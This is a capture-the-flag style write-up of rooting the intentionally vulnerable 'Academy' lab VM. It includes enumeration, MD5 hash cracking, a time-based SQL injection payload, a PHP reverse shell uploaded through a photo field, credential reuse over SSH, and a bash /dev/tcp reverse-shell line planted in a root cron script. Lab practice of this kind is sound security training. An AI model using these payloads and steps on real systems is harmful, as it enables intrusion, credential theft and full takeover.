## Box: [Academy] — Started: 2025-10-16 20:10

**IP/Host:** VM Mac ADDR `00:0c:29:e8:fc:4c`  |  **Status:** `In-Progress`
**Session 1 IP**: 192.168.109.131
**Session 2 IP**: 192.168.109.132
**Session 3 IP**: 192.168.109.134

### TL;DR

**NOTE**: This is an intentionally vulnerable machine, so I'm treating this as though it were a CTF. As such, data from the machine will be included in this writeup, and I will also do things I normally wouldn't do in an engagement (such as change a student's password!)

Initial: `reverse shell script on vulnerable file uploader function`. PrivEsc: `reverse shell one liner on vulnerable a cron job script`.

*Cumulative Impact Overview*:
- data exfil on unsecured site
- User access and disruption

### Exploit Lifecycle

1. *Validation & Recon*: Local VM vulnbox
2. *Enumeration & Scanning*:
    - `nmap -sV`
```bash
nmap -sV 192.168.109.131
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-16 20:50 EDT
Nmap scan report for 192.168.109.131
Host is up (0.000035s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
MAC Address: 00:0C:29:56:42:1F (VMware)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.42 seconds
```

Basically two lines of investigation so far-- notable that ssh is a possible third, but inefficient, so let's try the two easier once first.

##### Website first

- Open 80 -> website hosted by Apache. Navigating in browser to web address finds a default Apache page. 
    - `gobuster` enum results:
```bash
gobuster dir -u http://192.168.109.131 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.109.131
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/academy              (Status: 301) [Size: 320] [--> http://192.168.109.131/academy/]
/phpmyadmin           (Status: 301) [Size: 323] [--> http://192.168.109.131/phpmyadmin/]
/server-status        (Status: 403) [Size: 280]
Progress: 220558 / 220558 (100.00%)
===============================================================
Finished
===============================================================
```

3. *Findings & Exploits*:

`/academy`:
![[Pasted image 20251016211617.png|500]]
*this is a mySQL db as well*:
![[Pasted image 20251016212219.png|500]]


`phpmyadmin`:
![[Pasted image 20251016211805.png|500]]


##### FTP next

- FTP anon try:
```bash
ftp -a ftp://192.168.109.131
Connected to 192.168.109.131.
220 (vsFTPd 3.0.3)
331 Please specify the password.
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
200 Switching to Binary mode.
ftp> ls
229 Entering Extended Passive Mode (|||46560|)
150 Here comes the directory listing.
-rw-r--r--    1 1000     1000          776 May 30  2021 note.txt
226 Directory send OK.
ftp> get note.txt
local: note.txt remote: note.txt
229 Entering Extended Passive Mode (|||25783|)
150 Opening BINARY mode data connection for note.txt (776 bytes).
100% |*********************************************************************************************************************|   776      733.60 KiB/s    00:00 ETA
226 Transfer complete.
776 bytes received in 00:00 (520.83 KiB/s)
ftp> 

#### TERMINAL 2 ####
$ cat note.txt               
Hello Heath !
Grimmie has setup the test website for the new academy.
I told him not to use the same password everywhere, he will change it ASAP.


I couldn't create a user via the admin panel, so instead I inserted directly into the database with the following command:

INSERT INTO `students` (`StudentRegno`, `studentPhoto`, `password`, `studentName`, `pincode`, `session`, `department`, `semester`, `cgpa`, `creationdate`, `updationDate`) VALUES
('10201321', '', 'cd73502828457d15655bbd7a63fb0bc8', 'Rum Ham', '777777', '', '', '', '7.60', '2021-05-29 14:36:56', '');

The StudentRegno number is what you use for login.


Le me know what you think of this open-source project, it's from 2020 so it should be secure... right ?
We can always adapt it to our needs.

-jdelta

```

back to `/academy` webpage
- Student named "Rum Ham" might have a login at RegNo:pw of 10201321:cd73502828457d15655bbd7a63fb0bc8
    - password is likely a hash, trying it in the webpage confirms it as it does not login using the literal string. Will try `john` next. Looks like an MD5 so...
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 crackthis.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
student          (?)     
1g 0:00:00:00 DONE (2025-10-16 21:56) 100.0g/s 211200p/s 211200c/s 211200C/s amore..morado
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 

```
- Login success! creating a new password for a student... thxforlettingmein

On `/phpmyadmin` none of the above lets us in, so I'm attempting a `burpsuite` password attack with `grimmie`, since he seems to use insecure passwords according to `note.txt`.

- After attempting this I realized that the web app was redirecting to `phpmyadmin/index.php`, and it was obtaining a session cookie from `phpmyadmin` that was being used for auth. I could have done a two stage attack (where I first have `burpsuite` get the session cookie from `phpmyadmin` then attempt to bruteforce a login to `phpmyadmin/index.php` using the session cookie). But I don't have burpsuite pro, which would have been necessary to use macros from what I could see, so this would have been an inefficient lift.
 
I decided to pivot to a hydra attack to bruteforce `grimmie`'s password on SSH, since I had a username, but this also did not work.

Then I looked at what I knew, and decided I knew how to get into `academy` for sure, so maybe I could re-enumerate passing in the password and REGNO as the username in `gobuster`

```bash
gobuster dir -U 10201321 -P thxforlettingmein -u http://192.168.109.131/academy -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.109.131/academy
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Auth User:               10201321
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 326] [--> http://192.168.109.131/academy/admin/]
/assets               (Status: 301) [Size: 327] [--> http://192.168.109.131/academy/assets/]
/includes             (Status: 301) [Size: 329] [--> http://192.168.109.131/academy/includes/]
/db                   (Status: 301) [Size: 323] [--> http://192.168.109.131/academy/db/]
Progress: 220558 / 220558 (100.00%)
===============================================================
Finished
===============================================================

```

- `academy/admin` didn't work, because the student I was logging in as wasn't an admin. However `academy/db` yielded their SQL db which has a listing for the admin's password hash

4. *PrivEsc*:
```bash
INSERT INTO `admin` (`id`, `username`, `password`, `creationDate`, `updationDate`) VALUES
(1, 'admin', '21232f297a57a5a743894a0e4a801fc3', '2020-01-24 16:21:18', '03-06-2020 07:09:07 PM')
```

- running john...
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 crackthis.txt
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
admin            (?)     
1g 0:00:00:00 DONE (2025-10-17 00:05) 100.0g/s 1996Kp/s 1996Kc/s 1996KC/s clyde1..jonel
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed. 

```

- admin:admin into `academy/admin` from the second round of enum got us to the online course admin panel
![[Pasted image 20251017000737.png|500]]

- in the `admin` panel, attempting to reset Rum Ham's password shows the url in the browser tools uses a script that's called after the query operator:
http://192.168.109.131/academy/admin/manage-students.php?id=10201321&pass=update
- In the `admin` panel the majority of the tabs in the webapp don't seem to do much, but `/session` and `/department` accepts input that seems to get into the DB. This seems potentially vulnerable to SQL injection

Trying `sqlmap`:
```bash
└─$ sqlmap -r sqltesting.txt --batch

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:10:52 /2025-10-18/

[14:10:52] [INFO] parsing HTTP request from 'sqltesting.txt'
[14:10:52] [WARNING] provided value for parameter 'submit' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[14:10:52] [INFO] resuming back-end DBMS 'mysql' 
[14:10:52] [INFO] testing connection to the target URL
got a 302 redirect to 'http://192.168.109.132/academy/admin/index.php'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: sesssion (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: sesssion=test' AND (SELECT 7947 FROM (SELECT(SLEEP(5)))tKIo) AND 'LbYK'='LbYK&submit=
---
[14:10:52] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 10 (buster)
web application technology: Apache 2.4.38
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[14:10:52] [INFO] fetched data logged to text files under '/home/l1ch/.local/share/sqlmap/output/192.168.109.132'

[*] ending @ 14:10:52 /2025-10-18/

```

- Valid SQLi payload: sesssion=' AND (SELECT 7947 FROM (SELECT(SLEEP(5)))tKIo) AND 'LbYK'='LbYK
    - worked for both `/session` and `department`

At this point I started wondering if I was overcomplicating this, which would usually be when I look to a senior engineer for point in the right direction, so in my case I looked to a walkthrough. I thought working from the `admin` panel would have been the best way to continue to escalate or get a shell, however the walkthrough showed me that using the photo upload feature in `/academy` (non-admin panel) allowed for code exec, which if uploading a php reverse shell script allows you to connect and get a reverse shell.

Here is how that was done:
- paste code from https://github.com/pentestmonkey/php-reverse-shell to a shell script: `└─$ nano payloads/phprvshell.php` 
    - Ensure code is pointed at correct IPADDR and port for you, and other options are satisfied
- start nc listener on attack box for port and IP addr (see [[Shell Ops]] for more details)
- upload shell script to vuln app, like you would in the below screenshot by clicking `browse` > `update`:
![[Pasted image 20251018181558.png|500]]

- Reverse shell should have started on `netcat` listener you set up:
```bash
└─$ nc -nvlp 1234               
listening on [any] 1234 ...
connect to [192.168.109.128] from (UNKNOWN) [192.168.109.134] 34150
Linux academy 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64 GNU/Linux
 15:58:18 up 4 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

- From there we uploaded [[Linpeas|linpeas]] ran it, and got this useful output out of it:
```bash
==MYSQL PWD==

/var/www/html/academy/admin/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";
/var/www/html/academy/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";

Linpeas potential escalation vector:
* * * * * /home/grimmie/backup.sh
```

- outputting the contents of the `config.php` from above gives us:
```bash
$ cat /var/www/html/academy/admin/includes/config.php
<?php
$mysql_hostname = "localhost";
$mysql_user = "grimmie";
$mysql_password = "My_V3ryS3cur3_P4ss";
$mysql_database = "onlinecourse";
$bd = mysqli_connect($mysql_hostname, $mysql_user, $mysql_password, $mysql_database) or die("Could not connect database");
?>
```

- since `grimmie` reuses pws we know that `My_V3ryS3cur3_P4ss` is likely the same to ssh in as him. Sure enough...

```bash
┌──(l1ch㉿kali)-[~]
└─$ ssh grimmie@192.168.109.135
The authenticity of host '192.168.109.135 (192.168.109.135)' can't be established.
ED25519 key fingerprint is SHA256:eeNKTTakhvXyaWVPMDTB9+/4WEg6WKZwlUp0ATptgb0.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:2: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.109.135' (ED25519) to the list of known hosts.
grimmie@192.168.109.135's password: 
Linux academy 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Oct 18 18:34:36 2025 from 192.168.109.128
grimmie@academy:~$ ls
backup.sh

```

- because that backup.sh script likely runs as root we can try to get to root via reverse shell. Added this line to the `backup.sh` script:
```bash
bash -i >& /dev/tcp/192.168.109.128/1234 0>&1
```

```bash
┌──(l1ch㉿kali)-[~]
└─$ nc -nvlp 1234    
listening on [any] 1234 ...
connect to [192.168.109.128] from (UNKNOWN) [192.168.109.135] 58404
bash: cannot set terminal process group (837): Inappropriate ioctl for device
bash: no job control in this shell
root@academy:~#

```

5. *Post-Exploitation*:
- Rooted!
```bash
root@academy:~# ls   
ls
flag.txt
root@academy:~# cat flag.txt    
cat flag.txt
Congratz you rooted this box !
Looks like this CMS isn't so secure...
I hope you enjoyed it.
If you had any issue please let us know in the course discord.

Happy hacking !
root@academy:~# 
```

*Proof — path to flags/screenshot of boxpwn*:

### Findings

- _Found_: 80 - 192.168.109.131 - 2025-10-16 21:12:27 - Default Apache page served (`It works!`) — default vhost present; server reachable; potential fingerprinting/info exposure.
- *Found*: 21 - 192.168.109.131 - 2025-10-16 21:31:55 - FTP, while a non-vulnerable version, does allow for anonymous login. -> `note.txt` is downloadable anonymously, and is sensitive data exposure
    - *Found*: 21 -> 80 - 192.168.109.131/academy - 2025-10-16 22:00:19 - Was allowed access to student's account and ability to change their password
- *Found*: 80 - 192.168.109.131/academy/db - 2025-10-17 00:02:29 - unrestricted access to SQL db named `onlinecourse.sql`, which contains admin's password hash
- *Found*: 80 - 192.168.109.131/academy/admin - 2025-10-17 00:33:34 - Bad admin credentials (default admin credentials)
- *Found*: 80 - 192.168.109.134/academy - 2025-10-18 19:50:44 - Unsanitized file uploader in Student Photo feature of webapp allows for remote code execution, such as reverse shell which was successfully used for initial access
- *Found*: 22 - 192.168.109.134 - 2025-10-18 19:49:19 - Admin password reuse and unencrypted/permissive password file allows for wide access to system and SSH after initial reverse shell exploitation
- *Found*: 192.168.109.134 - 2025-10-18 19:49:06 - `www-data` user is able to change file permissions itself, which allows for further exploitation if shell access is gained. `www-data` user should instead call on a different, higher level user which authenticates the action to disallow file uploads and created files to be ran, which is an escaltion vector that was successfully exploited to gain access to the `grimmie` user

### Commands Learned or Commands Used

```bash
# annotate each command with purpose & timestamp
##  - examples:
nmap -sC -sV x.x.x.x         # quick scan — YYYY-MM-DD HH:MM
curl 'http://x.x.x.x/login'  # check auth endpoint
```

